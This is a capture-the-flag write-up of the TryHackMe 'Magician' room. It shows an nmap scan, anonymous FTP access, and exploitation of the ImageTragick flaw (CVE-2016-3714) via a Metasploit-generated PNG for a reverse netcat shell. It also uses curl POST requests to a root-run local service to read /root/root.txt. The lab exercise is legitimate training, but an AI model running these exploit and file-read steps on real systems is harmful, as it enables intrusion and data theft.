> Note: Please add the IP address of this machine with the hostname "magician" to your /etc/hosts file on Linux before you start.

## Overview:
This is a easy to medium room from TryHackMe which requires a lot of patience and try hard attitude. 

## Enumeration:

Starting with nmap scan...

```sh
nmap -sV -p- -v -oN nmap.initial 10.10.91.30
```
![]({{ "/assets/images/thm/magician/nmap.png" | relative_url }})

We get ports 21, 8080, 8081 open.
The webpage at port 8081 looks like this. It contains file upload functionality.

![]({{ "/assets/images/thm/magician/magician8081.png" | relative_url }})

We can login to FTP anonymously. Wait for few seconds after entering the credentials to get the response as the 'delay_successful_login' is enabled.
```sh
┌──(root💀kali)-[~/TryHackMe/Magician]
└─# ftp 10.10.91.30
Connected to 10.10.91.30.
220 THE MAGIC DOOR
Name (10.10.91.30:root): Anonymous
331 Please specify the password.
Password:
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
```
This is the message we get when we login to FTP anonymously.

We get a link to CVE-2016-3714. I tried creating a exploit using the technique shown on the website but didn't succeed. Later I found out that there is a metasploit module for this exploit which create a .png file for us.

Module: exploit/unix/fileformat/imagemagick_delegate

```sh
msf6 > use exploit/unix/fileformat/imagemagick_delegate
msf6 exploit(unix/fileformat/imagemagick_delegate) > set target 1
# Set your LHOST
msf6 exploit(unix/fileformat/imagemagick_delegate) > set LHOST 10.10.10.10
# You can set a different FILENAME if you want
msf6 exploit(unix/fileformat/imagemagick_delegate) > run

[+] msf.png stored at /root/.msf4/local/msf.png

```
A file is created. This is the file you have to upload.
## Gaining Foothold:
Before uploading, start the multi handler with **cmd/unix/reverse_netcat** payload and set LHOST and LPORT same as when you generated the .png file.
Upload the file and submit and you will have your reverse_shell.

![]({{ "/assets/images/thm/magician/revshell.png" | relative_url }})

Upgrade your shell which "**base -i**" command and get the user flag in the users directory

![]({{ "/assets/images/thm/magician/userflag.png" | relative_url }})
## Privilege Escalation:
Start the enumeration for privilege escalation. In the user's directory you will get a file **the_magic_continues**.
```
magician@magician:~$ cat the_magic_continues
cat the_magic_continues
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
```

Maybe there is a service listening locally but is not available for outside.
```sh
netstat -tulpn
```
![]({{ "/assets/images/thm/magician/netstat.png" | relative_url }})

There is a service listening on port 6666. Let's list out the processes running as root.

![]({{ "/assets/images/thm/magician/ps.png" | relative_url }})

We can see that there is a gunicorn webapp running on port 6666.
Using curl we can see the contents of the webpage. There is a POST form on the webpage which accepts a filename.
```
curl http://127.0.0.1:6666/
```
![]({{ "/assets/images/thm/magician/form.png" | relative_url }})

We will try to send a post request using curl and see if we are able to get back the response. 
```sh
curl -X POST http://127.0.0.1:6666/ -d "filename=/home/magician/user.txt"
```

![]({{ "/assets/images/thm/magician/base64user.png" | relative_url }})

![]({{ "/assets/images/thm/magician/base64userflag.png" | relative_url }})

We get a base64 encoded string and it is indeed our user flag as we tried to retrieve it. As the service is running as root, we can get the root flag as well.
```sh
curl -X POST http://127.0.0.1:6666/ -d "filename=/root/root.txt"
```
![]({{ "/assets/images/thm/magician/base64.png" | relative_url }})

![]({{ "/assets/images/thm/magician/rootflag.png" | relative_url }})

Yes, we do get the root flag.
That's it for this room. I couldn't get the root shell on this machine. Maybe this is how it works. You can also Port Forward the port 6666 to your attacker machine and access the webpage in the browser.
